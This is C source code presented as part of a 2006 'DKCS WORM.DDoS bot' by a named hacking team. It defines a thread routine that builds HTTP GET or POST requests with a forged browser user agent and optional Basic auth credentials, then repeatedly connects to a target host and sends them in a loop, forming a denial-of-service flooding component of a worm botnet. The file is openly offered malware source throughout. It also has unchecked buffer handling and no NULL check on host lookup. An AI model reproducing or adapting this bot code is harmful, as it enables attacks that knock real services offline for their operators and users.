//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
typedef struct DDOS_AUTH{
	bool	auth;
	char	*base64;
} DDOS_AUTH;
//-----------------------------------------------------------------
typedef struct DDOS_INFO{
	char		*host;
	int			port;
	char		*type;
	char		*action;
	char		*param;
	DDOS_AUTH	auth;
} DDOS_INFO;
//-----------------------------------------------------------------
SOCKET Connect(char *Host, short port){
	
	WSADATA				wsaData;
	SOCKET				Winsock;
	struct sockaddr_in	Winsock_In;
	struct hostent		*Ip;
    
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	Winsock=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
	if(Winsock == INVALID_SOCKET){
		WSACleanup();
		return -1;
	}
	Ip = gethostbyname(Host);
	Winsock_In.sin_port = htons(port);
	Winsock_In.sin_family = AF_INET;
	Winsock_In.sin_addr.s_addr = inet_addr(inet_ntoa(*((struct in_addr *)Ip->h_addr)));
	if(WSAConnect(Winsock, (SOCKADDR*)&Winsock_In, sizeof(Winsock_In), NULL, NULL, NULL, NULL) == SOCKET_ERROR){
        WSACleanup();
		return -1;
	}
return Winsock;
}
//-----------------------------------------------------------------
DWORD WINAPI StartDDoS(LPVOID param){
	char		packet[1024];
	SOCKET		socket;
	DDOS_INFO	ddos;

	ddos = *((DDOS_INFO*)param);
	if(lstrcmp(ddos.type, "get") == 0){
		wsprintf(packet, "GET %s?%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\r\nHost: %s\r\nAccept: */*\r\n",ddos.action, ddos.param, ddos.host);
		if(ddos.auth.auth){
			strcat(packet, "Authorization: Basic ");
			strcat(packet, ddos.auth.base64);
			strcat(packet, "\r\n\r\n");
		}else{
			strcat(packet, "\r\n");
		}
	}
	if(lstrcmp(ddos.type, "post") == 0){
		wsprintf(packet, "POST %s HTTP/1.0\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\r\nAccept: */*\r\nHost: %s\r\nContent-type: application/x-www-form-urlencoded\r\nContent-length: %d\r\n", ddos.action, ddos.host, (int)strlen(ddos.param));
		if(ddos.auth.auth){
			strcat(packet, "Authorization: Basic ");
			strcat(packet, ddos.auth.base64);
			strcat(packet, "\r\n\r\n");
			strcat(packet, ddos.param);
		}else{
			strcat(packet, "\r\n");
			strcat(packet, ddos.param);
		}
	}
	while(1){
		socket = Connect(ddos.host, ddos.port);
		if(socket == -1){
			return 0;
		}
		send(socket, packet, (int)strlen(packet), 0);
		Sleep(10*1000);
	}
	WSACleanup();
return 0;
}
//-----------------------------------------------------------------